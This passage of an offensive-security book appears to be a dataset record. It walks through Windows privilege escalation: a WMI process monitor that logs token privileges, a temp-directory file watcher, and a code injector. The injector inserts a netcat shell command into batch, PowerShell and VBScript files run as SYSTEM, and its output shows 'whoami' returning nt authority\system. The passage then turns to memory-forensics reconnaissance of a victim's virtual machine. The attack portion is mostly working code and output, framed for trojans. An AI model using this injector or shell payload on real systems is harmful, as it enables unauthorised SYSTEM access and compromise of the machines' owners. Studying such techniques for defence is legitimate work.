the location of the script to run, set a time out of one minute,\nand create the event object 1. In the method, we set the\nSvcStop\nservice status and stop the service 2. In the method, we\nSvcDoRun\nstart the service and call the method in which our tasks will run\nmain\n3. We define this method next:\nmain\ndef main(self):\n1\nwhile True:\nret_code = win32event.WaitForSingleObject(\nself.hWaitStop, self.timeout)\n2\nif ret_code == win32event.WAIT_OBJECT_0:\nservicemanager.LogInfoMsg(\"Service is\nstopping\")\nbreak\nsrc = os.path.join(SRCDIR, 'bhservice_task.vbs')\nshutil.copy(src, self.vbs)\n3\nsubprocess.call(\"cscript.exe %s\" % self.vbs,\nshell=False)\nos.unlink(self.vbs)\nIn , we set up a loop 1 that runs every minute, because of the\nmain\nparameter, until the service receives the stop signal 2.\nself.timeout\nWhile it’s running, we copy the script file to the target directory,\nexecute the script, and remove the file 3.\nIn the main block, we handle any command line arguments:\nif __name__ == '__main__':\nif len(sys.argv) == 1:\nservicemanager.Initialize()\nservicemanager.PrepareToHostSingle(BHServerSvc)\nservicemanager.StartServiceCtrlDispatcher()\nelse:\nwin32serviceutil.HandleCommandLine(BHServerSvc)\nYou may sometimes want to create a real service on a victim\nmachine. This skeleton framework gives you the outline for how to\nstructure one.\nYou can find the bhservice_tasks.vbs script at\nhttps://nostarch.com/black-hat-python2E/. Place the file in a directory\nwith bhservice.py and change to point to this directory. Your\nSRCDIR\ndirectory should look like this:\n06/22/2020 09:02 AM <DIR> .\n06/22/2020 09:02 AM <DIR> ..\n06/22/2020 11:26 AM 2,099 bhservice.py\n06/22/2020 11:08 AM 2,501\nbhservice_task.vbs\nNow create the service executable with :\npyinstaller\nC:\\Users\\tim\\work> pyinstaller -F --hiddenimport\nwin32timezone bhservice.py\nThis command saves the bservice.exe file in the dist subdirectory.\nLet’s change into that directory to install the service and get it\nstarted. As Administrator, run these commands:\nC:\\Users\\tim\\work\\dist> bhservice.exe install\nC:\\Users\\tim\\work\\dist> bhservice.exe start\nNow, every minute, the service will write the script file into a\ntemporary directory, execute the script, and delete the file. It will do\nthis until you run the command:\nstop\nC:\\Users\\tim\\work\\dist> bhservice.exe stop\nYou can start or stop the service as many times as you like. Keep\nin mind that if you change the code in bhservice.py, you’ll also have\nto create a new executable with and have Windows\npyinstaller\nreload the service with the command. When you’ve\nbhserviceupdate\nfinished playing around with the service in this chapter, remove it\nwith .\nbhserviceremove\nYou should be good to go. Now let’s get on with the fun part!\nCreating a Process Monitor\nSeveral years ago, Justin, one of the authors of this book,\ncontributed to El Jefe, a project of the security provider Immunity. At\nits core, El Jefe is a very simple process-monitoring system. The tool\nis designed to help people on defensive teams track process\ncreation and the installation of malware.\nWhile consulting one day, his coworker Mark Wuergler suggested\nthat they use El Jefe offensively: with it, they could monitor\nprocesses executed as SYSTEM on the target Windows machines.\nThis would provide insight into potentially insecure file handling or\nchild process creation. It worked, and they walked away with\nnumerous privilege escalation bugs, giving them the keys to the\nkingdom.\nThe major drawback of the original El Jefe was that it used a DLL,\ninjected into every process, to intercept calls to the native\nfunction. It then used a named pipe to communicate\nCreateProcess\nwith the collection client, which forwarded the details of the process\ncreation to the logging server. Unfortunately, most antivirus software\nalso hooks the calls, so either they view you as\nCreateProcess\nmalware or you have system instability issues when running El Jefe\nside by side with the antivirus software.\nWe’ll re-create some of El Jefe’s monitoring capabilities in a\nhookless manner, gearing it toward offensive techniques. This\nshould make our monitoring portable and give us the ability to run it\nalongside antivirus software without issue.\nProcess Monitoring with WMI\nThe Windows Management Instrumentation (WMI) API gives\nprogrammers the ability to monitor a system for certain events and\nthen receive callbacks when those events occur. We’ll leverage this\ninterface to receive a callback every time a process is created and\nthen log some valuable information: the time the process was\ncreated, the user who spawned the process, the executable that was\nlaunched and its command line arguments, the process ID, and the\nparent process ID. This will show us any processes created by\nhigher-privilege accounts, and in particular, any processes that call\nexternal files, such as VBScript or batch scripts. When we have all of\nthis information, we’ll also determine the privileges enabled on the\nprocess tokens. In certain rare cases, you’ll find processes that were\ncreated as a regular user but have been granted additional Windows\nprivileges that you can leverage.\nLet’s begin by writing a very simple monitoring script that provides\nthe basic process information and then build on that to determine the\nenabled privileges. This code was adapted from the Python WMI\npage (http://timgolden.me.uk/python/wmi/tutorial.html). Note that in\norder to capture information about high-privilege processes created\nby SYSTEM, for example, you’ll need to run your monitoring script\nas Administrator. Start by adding the following code to\nprocess_monitor.py:\nimport os\nimport sys\nimport win32api\nimport win32con\nimport win32security\nimport wmi\ndef log_to_file(message):\nwith open('process_monitor_log.csv', 'a') as fd:\nfd.write(f'{message}\\r\\n')\ndef monitor():\nhead = 'CommandLine, Time, Executable, Parent PID, PID,\nUser, Privileges'\nlog_to_file(head)\n1\nc = wmi.WMI()\n2\nprocess_watcher = c.Win32_Process.watch_for('creation')\nwhile True:\ntry:\n3\nnew_process = process_watcher()\ncmdline = new_process.CommandLine\ncreate_date = new_process.CreationDate\nexecutable = new_process.ExecutablePath\nparent_pid = new_process.ParentProcessId\npid = new_process.ProcessId\n4\nproc_owner = new_process.GetOwner()\nprivileges = 'N/A'\nprocess_log_message = (\nf'{cmdline} , {create_date} , {executable},'\nf'{parent_pid} , {pid} , {proc_owner} ,\n{privileges}'\n)\nprint(process_log_message)\nprint()\nlog_to_file(process_log_message)\nexcept Exception:\npass\nif __name__ == '__main__':\nmonitor()\nWe start by instantiating the WMI class 1 and tell it to watch for the\nprocess creation event 2. We then enter a loop, which blocks until\nreturns a new process event 3. The new process\nprocess_watcher\nevent is a WMI class called that contains all of the\nWin32_Process\nrelevant information we’re after (see MSDN documentation online for\nmore information on the WMI class). One of the class\nWin32_Process\nfunctions is , which we call 4 to determine who spawned the\nGetOwner\nprocess. We collect all of the process information we’re looking for,\noutput it to the screen, and log it to a file.\nKicking the Tires\nLet’s fire up the process-monitoring script and create some\nprocesses to see what the output looks like:\nC:\\Users\\tim\\work>python process_monitor.py\n\"Calculator.exe\",\n20200624083538.964492-240 ,\nC:\\Program\nFiles\\WindowsApps\\Microsoft.WindowsCalculator\\Calculator.exe,\n1204 ,\n10312 ,\n('DESKTOP-CC91N7I', 0, 'tim') ,\nN/A\nnotepad ,\n20200624083340.325593-240 ,\nC:\\Windows\\system32\\notepad.exe,\n13184 ,\n12788 ,\n('DESKTOP-CC91N7I', 0, 'tim') ,\nN/A\nAfter running the script, we ran notepad.exe and calc.exe. As you\ncan see, the tool outputs this process information correctly. You\ncould now take an extended break, let this script run for a day, and\ncapture records of all the running processes, scheduled tasks, and\nvarious software updaters. You might spot malware if you’re\n(un)lucky. It’s also useful to log in and out of the system, as events\ngenerated from these actions could indicate privileged processes.\nNow that we have basic process monitoring in place, let’s fill out\nthe privileges field in our logging. First, though, you should learn a\nlittle bit about how Windows privileges work and why they’re\nimportant.\nWindows Token Privileges\nA Windows token is, per Microsoft, “an object that describes the\nsecurity context of a process or thread” (see “Access Tokens” at\nhttp://msdn.microsoft.com/).In other words, the token’s permissions\nand privileges determine which tasks a process or thread can\nperform.\nMisunderstanding these tokens can land you in trouble. As part of\na security product, a well-intentioned developer might create a\nsystem tray application on which they’d like to give an unprivileged\nuser the ability to control the main Windows service, which is a\ndriver. The developer uses the native Windows API function\non the process and then, innocently enough,\nAdjustTokenPrivileges\ngrants the system tray application the privilege. What\nSeLoadDriver\nthe developer doesn’t notice is that if you can climb inside that\nsystem tray application, you now have the ability to load or unload\nany driver you want, which means you can drop a kernel mode\nrootkit—and that means game over.\nBear in mind that if you can’t run your process monitor as\nSYSTEM or Administrator, then you need to keep an eye on what\nprocesses you are able to monitor. Are there any additional\nprivileges you can leverage? A process running as a user with the\nwrong privileges is a fantastic way to get to SYSTEM or run code in\nthe kernel. Table 10-1 lists interesting privileges that the authors\nalways look out for. It isn’t exhaustive, but it serves as a good\nstarting point. You can find a full list of privileges on the MSDN\nwebsite.\nTable 10-1: Interesting Privileges\nPrivileg Access that is granted\ne name\nSeBacku This enables the user process to back up files and directories, and it\npPrivil grants READ access to files no matter what their access control list\nege (ACL) defines.\nSeDebug This enables the user process to debug other processes. It also\nPrivile includes obtaining process handles to inject DLLs or code into running\nge processes.\nSeLoadD This enables a user process to load or unload drivers.\nriver\nNow that you know which privileges to look for, let’s leverage\nPython to automatically retrieve the enabled privileges on the\nprocesses we’re monitoring. We’ll make use of the ,\nwin32security\n, and modules. If you encounter a situation where\nwin32api win32con\nyou can’t load these modules, try translating all of the following\nfunctions into native calls using the library. This is possible,\nctypes\nthough it’s a lot more work.\nAdd the following code to process_monitor.py directly above the\nexisting function:\nlog_to_file\ndef get_process_privileges(pid):\ntry:\n1\nhproc = win32api.OpenProcess(\nwin32con.PROCESS_QUERY_INFORMATION, False, pid\n)\nhtok = win32security.OpenProcessToken(hproc,\n2\nwin32con.TOKEN_QUERY)\n3\nprivs = win32security.GetTokenInformation(\nhtok,win32security.TokenPrivileges\n)\nprivileges = ''\nfor priv_id, flags in privs:\nif flags == (win32security.SE_PRIVILEGE_ENABLED |\n4\nwin32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT):\nprivileges +=\n5\nf'{win32security.LookupPrivilegeName(None, priv_id)}|'\nexcept Exception:\nprivileges = 'N/A'\nreturn privileges\nWe use the process ID to obtain a handle to the target process 1.\nNext, we crack open the process token 2 and request the token\ninformation for that process 3 by sending the\nstructure. The function call returns a\nwin32security.TokenPrivileges\nlist of tuples, where the first member of the tuple is the privilege and\nthe second member describes whether the privilege is enabled or\nnot. Because we’re concerned with only the enabled ones, we first\ncheck for the enabled bits 4 and then look up the human-readable\nname for that privilege 5.\nNext, modify the existing code to properly output and log this\ninformation. Change the line of code\nprivileges = \"N/A\"\nto the following:\nprivileges = get_process_privileges(pid)\nNow that we’ve added the privilege-tracking code, let’s rerun the\nprocess_monitor.py script and check the output. You should see\nprivilege information:\nC:\\Users\\tim\\work> python.exe process_monitor.py\n\"Calculator.exe\",\n20200624084445.120519-240 ,\nC:\\Program\nFiles\\WindowsApps\\Microsoft.WindowsCalculator\\Calculator.exe,\n1204 ,\n13116 ,\n('DESKTOP-CC91N7I', 0, 'tim') ,\nSeChangeNotifyPrivilege|\nnotepad ,\n20200624084436.727998-240 ,\nC:\\Windows\\system32\\notepad.exe,\n10720 ,\n2732 ,\n('DESKTOP-CC91N7I', 0, 'tim') ,\nSeChangeNotifyPrivilege|SeImpersonatePrivilege|SeCreateGlobal\nPrivilege|\nYou can see that we’ve managed to log the enabled privileges for\nthese processes. Now we could easily put some intelligence into the\nscript to log only processes that run as an unprivileged user but have\ninteresting privileges enabled. This use of process monitoring will let\nus find processes that rely on external files insecurely.\nWinning the Race\nBatch, VBScript, and PowerShell scripts make system\nadministrators’ lives easier by automating humdrum tasks. They\nmight continually register with a central inventory service, for\nexample, or force updates of software from their own repositories.\nOne common problem is the lack of proper access controls on these\nscripting files. In a number of cases, on otherwise secure servers,\nwe’ve found batch or PowerShell scripts that run once a day by the\nSYSTEM user while being globally writable by any user.\nIf you run your process monitor long enough in an enterprise (or\nyou simply install the sample service provided in the beginning of\nthis chapter), you might see process records that look like this:\nwscript.exe C:\\Windows\\TEMP\\bhservice_task.vbs ,\n20200624102235.287541-240 ,\nC:\\Windows\\SysWOW64\\wscript.exe,2828 , 17516 , ('NT\nAUTHORITY', 0, 'SYSTEM') ,\nSeLockMemoryPrivilege|SeTcbPrivilege|SeSystemProfilePrivilege\n|SeProfileSingleProcessPrivilege|SeIncreaseBasePriorityPrivil\nege|SeCreatePagefilePrivilege|SeCreatePermanentPrivilege|SeDe\nbugPrivilege|SeAuditPrivilege|SeChangeNotifyPrivilege|SeImper\nsonatePrivilege|SeCreateGlobalPrivilege|SeIncreaseWorkingSetP\nrivilege|SeTimeZonePrivilege|SeCreateSymbolicLinkPrivilege|Se\nDelegateSessionUserImpersonatePrivilege|\nYou can see that a SYSTEM process has spawned the wscript.exe\nbinary and passed in the\nC:\\WINDOWS\\TEMP\\bhservice_task.vbs\nparameter. The sample bhservice you created at the beginning of the\nchapter should generate these events once per minute.\nBut if you list the contents of the directory, you won’t see this file\npresent. This is because the service creates a file containing\nVBScript and then executes and removes that VBScript. We’ve seen\nthis action performed by commercial software in a number of cases;\noften, software creates files in a temporary location, writes\ncommands into the files, executes the resulting program files, and\nthen deletes those files.\nIn order to exploit this condition, we have to effectively win a race\nagainst the executing code. When the software or scheduled task\ncreates the file, we need to be able to inject our own code into the\nfile before the process executes and deletes it. The trick to this is in\nthe handy Windows API , which enables us to\nReadDirectoryChangesW\nmonitor a directory for any changes to files or subdirectories. We can\nalso filter these events so that we’re able to determine when the file\nhas been saved. That way, we can quickly inject our code into it\nbefore it’s executed. You may find it incredibly useful to simply keep\nan eye on all temporary directories for a period of 24 hours or longer;\nsometimes, you’ll find interesting bugs or information disclosures on\ntop of potential privilege escalations.\nLet’s begin by creating a file monitor. We’ll then build on it to\nautomatically inject code. Save a new file called file_monitor.py and\nhammer out the following:\n# Modified example that is originally given here:\n#\nhttp://timgolden.me.uk/python/win32_how_do_i/watch_directory_\nfor_changes.html\nimport os\nimport tempfile\nimport threading\nimport win32con\nimport win32file\nFILE_CREATED = 1\nFILE_DELETED = 2\nFILE_MODIFIED = 3\nFILE_RENAMED_FROM = 4\nFILE_RENAMED_TO = 5\nFILE_LIST_DIRECTORY = 0x0001\n1\nPATHS = ['c:\\\\WINDOWS\\\\Temp', tempfile.gettempdir()]\ndef monitor(path_to_watch):\n2\nh_directory = win32file.CreateFile(\npath_to_watch,\nFILE_LIST_DIRECTORY,\nwin32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE\n|\nwin32con.FILE_SHARE_DELETE,\nNone,\nwin32con.OPEN_EXISTING,\nwin32con.FILE_FLAG_BACKUP_SEMANTICS,\nNone\n)\nwhile True:\ntry:\n3\nresults = win32file.ReadDirectoryChangesW(\nh_directory,\n1024,\nTrue,\nwin32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |\nwin32con.FILE_NOTIFY_CHANGE_DIR_NAME |\nwin32con.FILE_NOTIFY_CHANGE_FILE_NAME |\nwin32con.FILE_NOTIFY_CHANGE_LAST_WRITE |\nwin32con.FILE_NOTIFY_CHANGE_SECURITY |\nwin32con.FILE_NOTIFY_CHANGE_SIZE,\nNone,\nNone\n)\n4\nfor action, file_name in results:\nfull_filename = os.path.join(path_to_watch,\nfile_name)\nif action == FILE_CREATED:\nprint(f'[+] Created {full_filename}')\nelif action == FILE_DELETED:\nprint(f'[-] Deleted {full_filename}')\nelif action == FILE_MODIFIED:\nprint(f'[*] Modified {full_filename}')\ntry:\nprint('[vvv] Dumping contents ... ')\n5\nwith open(full_filename) as f:\ncontents = f.read()\nprint(contents)\nprint('[^^^] Dump complete.')\nexcept Exception as e:\nprint(f'[!!!] Dump failed. {e}')\nelif action == FILE_RENAMED_FROM:\nprint(f'[>] Renamed from\n{full_filename}')\nelif action == FILE_RENAMED_TO:\nprint(f'[<] Renamed to {full_filename}')\nelse:\nprint(f'[?] Unknown action on\n{full_filename}')\nexcept Exception:\npass\nif __name__ == '__main__':\nfor path in PATHS:\nmonitor_thread = threading.Thread(target=monitor,\nargs=(path,))\nmonitor_thread.start()\nWe define a list of directories that we’d like to monitor 1, which in\nour case are the two common temporary file directories. You might\nwant to keep an eye on other places, so edit this list as you see fit.\nFor each of these paths, we’ll create a monitoring thread that calls\nthe function. The first task of this function is to acquire\nstart_monitor\na handle to the directory we wish to monitor 2. We then call the\nfunction 3, which notifies us when a change\nReadDirectoryChangesW\noccurs. We receive the filename of the changed target file and the\ntype of event that happened 4. From here, we print out useful\ninformation about what happened to that particular file, and if we\ndetect that it has been modified, we dump out the contents of the file\nfor reference 5.\nKicking the Tires\nOpen a cmd.exe shell and run file_monitor.py:\nC:\\Users\\tim\\work> python.exe file_monitor.py\nOpen a second cmd.exe shell and execute the following\ncommands:\nC:\\Users\\tim\\work> cd C:\\Windows\\temp\nC:\\Windows\\Temp> echo hello > filetest.bat\nC:\\Windows\\Temp> rename filetest.bat file2test\nC:\\Windows\\Temp> del file2test\nYou should see output that looks like the following:\n[+] Created c:\\WINDOWS\\Temp\\filetest.bat\n[*] Modified c:\\WINDOWS\\Temp\\filetest.bat\n[vvv] Dumping contents ...\nhello\n[^^^] Dump complete.\n[>] Renamed from c:\\WINDOWS\\Temp\\filetest.bat\n[<] Renamed to c:\\WINDOWS\\Temp\\file2test\n[-] Deleted c:\\WINDOWS\\Temp\\file2test\nIf everything has worked as planned, we encourage you to keep\nyour file monitor running for 24 hours on a target system. You may\nbe surprised to see files being created, executed, and deleted. You\ncan also use your process-monitoring script to look for additional\ninteresting filepaths to monitor. Software updates could be of\nparticular interest.\nLet’s add the ability to inject code into these files.\nCode Injection\nNow that we can monitor processes and file locations, we’ll\nautomatically inject code into target files. We’ll create very simple\ncode snippets that spawn a compiled version of the netcat.py tool\nwith the privilege level of the originating service. There is a vast\narray of nasty things you can do with these VBScript, batch, and\nPowerShell files. We’ll create the general framework, and you can\nrun wild from there. Modify the file_monitor.py script and add the\nfollowing code after the file modification constants:\nNETCAT = 'c:\\\\users\\\\tim\\\\work\\\\netcat.exe'\nTGT_IP = '192.168.1.208'\nCMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '\nThe code we’re about to inject will use these constants: is\nTGT_IP\nthe IP address of the victim (the Windows box we’re injecting code\ninto) and is the port we’ll connect to. The variable\nTGT_PORT NETCAT\ngives the location of the Netcat substitute we coded in Chapter 2. If\nyou haven’t created an executable from that code, you can do so\nnow:\nC:\\Users\\tim\\netcat> pyinstaller -F netcat.py\nThen drop the resulting netcat.exe file into your directory and\nmake sure the variable points to that executable.\nNETCAT\nThe command our injected code will execute creates a reverse\ncommand shell:\n1\nFILE_TYPES = {\n'.bat': [\"\\r\\nREM bhpmarker\\r\\n\", f'\\r\\n{CMD}\\r\\n'],\n'.ps1': [\"\\r\\n#bhpmarker\\r\\n\", f'\\r\\nStart-Process \"\n{CMD}\"\\r\\n'],\n'.vbs': [\"\\r\\n'bhpmarker\\r\\n\",\nf'\\r\\nCreateObject(\"Wscript.Shell\").Run(\"{CMD}\")\\r\\n'],\n}\ndef inject_code(full_filename, contents, extension):\n2\nif FILE_TYPES[extension][0].strip() in contents:\nreturn\n3\nfull_contents = FILE_TYPES[extension][0]\nfull_contents += FILE_TYPES[extension][1]\nfull_contents += contents\nwith open(full_filename, 'w') as f:\nf.write(full_contents)\nprint('\\\\o/ Injected Code')\nWe start by defining a dictionary of code snippets that match a\nparticular file extension 1. The snippets include a unique marker and\nthe code we want to inject. The reason we use a marker is to avoid\nan infinite loop whereby we see a file modification, insert our code,\nand cause the program to detect this action as a file modification\nevent. Left alone, this cycle would continue until the file gets gigantic\nand the hard drive begins to cry. Instead, the program will check for\nthe marker and, if it finds it, know not to modify the file a second\ntime.\nNext, the function handles the actual code injection\ninject_code\nand file marker checking. After we verify that the marker doesn’t\nexist 2, we write the marker and the code we want the target process\nto run 3. Now we need to modify our main event loop to include our\nfile extension check and the call to :\ninject_code\n--snip--\nelif action == FILE_MODIFIED:\n1\nextension =\nos.path.splitext(full_filename)[1]\n2\nif extension in FILE_TYPES:\nprint(f'[*] Modified {full_filename}')\nprint('[vvv] Dumping contents ... ')\ntry:\nwith open(full_filename) as f:\ncontents = f.read()\n# NEW CODE\ninject_code(full_filename, contents,\nextension)\nprint(contents)\nprint('[^^^] Dump complete.')\nexcept Exception as e:\nprint(f'[!!!] Dump failed. {e}')\n--snip--\nThis is a pretty straightforward addition to the primary loop. We do\na quick split of the file extension 1 and then check it against our\ndictionary of known file types 2. If the file extension is detected in the\ndictionary, we call the function. Let’s take it for a spin.\ninject_code\nKicking the Tires\nIf you installed the bhservice at the beginning of this chapter, you\ncan easily test your fancy new code injector. Make sure the service\nis running and then execute your file_monitor.py script. Eventually,\nyou should see output indicating that a .vbs file has been created\nand modified and that code has been injected. In the following\nexample, we’ve commented out the printing of the contents to save\nspace:\n[*] Modified c:\\Windows\\Temp\\bhservice_task.vbs\n[vvv] Dumping contents ...\n\\o/ Injected Code\n[^^^] Dump complete.\nIf you open a new cmd window, you should see that the target port\nis open:\nc:\\Users\\tim\\work> netstat -an |findstr 9999\nTCP 192.168.1.208:9999 0.0.0.0:0\nLISTENING\nIf all went well, you can use the command or run the netcat.py\nnc\nscript from Chapter 2 to connect the listener you just spawned. To\nmake sure your privilege escalation worked, connect to the listener\nfrom your Kali machine and check which user you’re running as:\n$ nc -nv 192.168.1.208 9999\nConnection to 192.168.1.208 port 9999 [tcp/*] succeeded!\n#> whoami\nnt authority\\system\n#> exit\nThis should indicate that you’ve obtained the privileges of the holy\nSYSTEM account. Your code injection worked.\nYou may have reached the end of this chapter thinking that some\nof these attacks are a bit esoteric. But if you spend enough time\ninside a large enterprise, you’ll realize these tactics are quite viable.\nYou can easily expand the tooling in this chapter, or turn it into\nspecialty scripts to compromise a local account or application. WMI\nalone can be an excellent source of local recon data; it can enable\nyou to further an attack once you’re inside a network. Privilege\nescalation is an essential piece to any good trojan.",
    "question": "How can one use Windows Management Instrumentation (WMI) to monitor process creation and inject code into target files to escalate privileges on a Windows system?",
    "summary": "This text discusses methods for escalating privileges on Windows systems, emphasizing the importance of having multiple techniques to maintain access. It covers creating a vulnerable service that executes scripts, using WMI to monitor process creation and track privileges, and leveraging file monitoring to inject code into temporary files before they are executed. The goal is to gain elevated privileges, often by exploiting processes running with higher permissions or by finding vulnerabilities in system services or scripts."
  },
  {
    "start": 90,
    "end": 95,
    "text": "11\nOFFENSIVE FORENSICS\nForensics folks are often the people\ncalled in after a breach, or to determine\nif an “incident” has taken place at all.\nThey typically want a snapshot of the\naffected machine’s RAM in order to\ncapture cryptographic keys or other\ninformation that resides only in memory. Lucky for\nthem, a team of talented developers has created an\nentire Python framework called Volatility that’s\nsuitable for this task and is billed as an advanced\nmemory forensics framework. Incident responders,\nforensic examiners, and malware analysts can use\nVolatility for a variety of other tasks as well, including\ninspecting kernel objects, examining and dumping\nprocesses, and so on.\nAlthough Volatility is software for the defensive side, any\nsufficiently powerful tool can be used for offense or defense. We will\nuse Volatility to perform reconnaissance on a target user and write\nour own offensive plug-ins to search for weakly defended processes\nrunning on a virtual machine (VM).\nSuppose you infiltrate a machine and discover that the user\nemploys a VM for sensitive work. Chances are good that the user\nhas also made a snapshot of the VM as a safety net in case anything\ngoes wrong with it. We will use the Volatility memory analysis\nframework to analyze the snapshot to find out how the VM is used\nand what processes were running. We’ll also investigate possible\nvulnerabilities we can leverage for further exploitation.\nLet’s get started!\nInstallation\nVolatility has been around for several years and has just undergone\na complete rewrite. Not only is the code base now founded on\nPython 3, but the entire framework has been refactored so that the\ncomponents are independent; all state required to run a plug-in is\nself-contained.\nLet’s create a virtual environment just for our work with Volatility.\nFor this example, we are using Python 3 on a Windows machine in a\nPowerShell terminal. If you are also working from a Windows\nmachine, make sure you have installed. You can download it at\ngit\nhttps://git-scm.com/downloads/.\n1\nPS> python3 -m venv vol3\nPS> vol3/Scripts/Activate.ps1\nPS> cd vol3/\n2\nPS> git clone\nhttps://github.com/volatilityfoundation/volatility3.git\nPS> cd volatility3/\nPS> python setup.py install\n3\nPS> pip install pycryptodome\nFirst, we create a new virtual environment called and activate\nvol3\nit 1. Next, we move into the virtual environment directory and clone\nthe Volatility 3 GitHub repo 2, install it into the virtual environment,\nand finally install 3, which we’ll need later.\npycryptodome\nTo see the plug-ins Volatility offers, as well as a list of options, use\nthe following command on Windows:\nPS> vol --help\nOn Linux or Mac, use the Python executable from the virtual\nenvironment, as follows:\n$> python vol.py --help\nIn this chapter, we’ll use Volatility from the command line, but there\nare various ways you might encounter the framework. For example,\nsee the Volumetric project from Volatility, a free web-based GUI for\nvolatility (https://github.com/volatilityfoundation/volumetric/). You can\ndig into code examples in the Volumetric project to see how you can\nuse Volatility in your own programs. Additionally, you can use the\ninterface, which provides you with access to the Volatility\nvolshell\nframework and works as a normal interactive Python shell.\nIn the examples that follow, we’ll use the Volatility command line.\nTo save space, the output has been edited to show only the output\ndiscussed, so be aware that your output will have more lines and\ncolumns.\nNow let’s delve into some code and have a look inside the\nframework:\nPS> cd volatility/framework/plugins/windows/\nPS> ls\n_init__.py driverscan.py memmap.py psscan.py\nvadinfo.py\nbigpools.py filescan.py modscan.py pstree.py\nvadyarascan.py\ncachedump.py handles.py modules.py registry/\nverinfo.py\ncallbacks.py hashdump.py mutantscan.py ssdt.py\nvirtmap.py\ncmdline.py info.py netscan.py strings.py\ndlllist.py lsadump.py poolscanner.py svcscan.py\ndriverirp.py malfind.py pslist.py symlinkscan.py\nThis listing shows the Python files inside the Windows plugin\ndirectory. We highly encourage you to spend some time looking at\nthe code in these files. You’ll see a recurring pattern that forms the\nstructure of a Volatility plug-in. This will help you understand the\nframework, but more importantly, it will give you a picture of a\ndefender’s mindset and intentions. By knowing what defenders are\ncapable of and how they accomplish their objectives, you will make\nyourself into a more capable hacker and better understand how to\nprotect yourself from detection.\nNow that we have the analysis framework ready, we need some\nmemory images to analyze. The easiest way to get one is to take a\nsnapshot of your own Windows 10 virtual machine.\nFirst, power up your Windows VM and start a few processes (for\ninstance, the notepad, the calculator, and a browser); we’ll examine\nthe memory and track how these processes started. Then, take your\nsnapshot using your hypervisor of choice. In the directory where your\nhypervisor stores your VMs, you’ll see your new snapshot file with a\nname that ends with .vmem or .mem. Let’s start doing some recon!\nNote that you can also find many memory images online. One\nimage we’ll look at in this chapter is provided by PassMark Software\nat https://www.osforensics.com/tools/volatility-workbench.html/. The\nVolatility Foundation site also has several images to play with at\nhttps://github.com/volatilityfoundation/volatility/wiki/Memory-\nSamples/.\nGeneral Reconnaissance\nLet’s get an overview of the machine we’re analyzing. The\nplug-in shows the operating system and kernel\nwindows.info\ninformation of the memory sample:\n1\nPS>vol -f WinDev2007Eval-Snapshot4.vmem windows.info\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nVariable Value\nKernel Base 0xf80067a18000\nDTB 0x1aa000\nprimary 0 WindowsIntel32e\nmemory_layer 1 FileLayer\nKdVersionBlock 0xf800686272f0\nMajor/Minor 15.19041\nMachineType 34404\nKeNumberProcessors 1\nSystemTime 2020-09-04 00:53:46\nNtProductType NtProductWinNt\nNtMajorVersion 10\nNtMinorVersion 0\nPE MajorOperatingSystemVersion 10\nPE MinorOperatingSystemVersion 0\nPE Machine 34404\nWe specify the snapshot filename with the switch and the\n-f\nWindows plug-in to use, 1. Volatility reads and analyzes\nwindows.info\nthe memory file and outputs general information about this Windows\nmachine. We can see that we’re dealing with a Windows 10.0 VM\nand that it has a single processor and a single memory layer.\nYou might find it educational to try several plug-ins on the memory\nimage file while reviewing the plug-in code. Spending time reading\ncode and seeing the corresponding output will show you how the\ncode is supposed to work as well as the general mindset of the\ndefenders.\nNext, with the plug-in, we can print the values\nregistry.printkey\nof a key in the registry. There is a wealth of information in the\nregistry, and Volatility provides a way to find any value we wish.\nHere, we look for installed services. The key\n/ControlSet001/Services shows the Service Control Manager\ndatabase, which lists all the installed services:\nPS>vol -f WinDev2007Eval-7d959ee5.vmem\nwindows.registry.printkey --key 'ControlSet001\\Services'\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\n... Key Name Data\nVolatile\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services .NET CLR Data\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Appinfo\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services applockerfltr\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\nAtomicAlarmClock False\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Beep\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services fastfat\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\nMozillaMaintenance False\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services NTDS\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Ntfs\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\nShellHWDetection False\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services SQLWriter\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Tcpip\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Tcpip6\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services terminpt\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services W32Time\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services WaaSMedicSvc\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services WacomPen\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services Winsock\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services WinSock2\nFalse\n\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services WINUSB\nFalse\nThis output shows a list of installed services on the machine\n(abbreviated for space).\nUser Reconnaissance\nNow let’s do some recon on the user of the VM. The plug-in\ncmdline\nlists the command line arguments for each process as they were\nrunning at the time the snapshot was made. These processes give\nus a hint as to the user’s behavior and intent.\nPS>vol -f WinDev2007Eval-7d959ee5.vmem windows.cmdline\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nPID Process Args\n72 Registry Required memory at 0x20 is not valid\n(process exited?)\n340 smss.exe Required memory at 0xa5f1873020 is\ninaccessible (swapped)\n564 lsass.exe C:\\Windows\\system32\\lsass.exe\n624 winlogon.exe 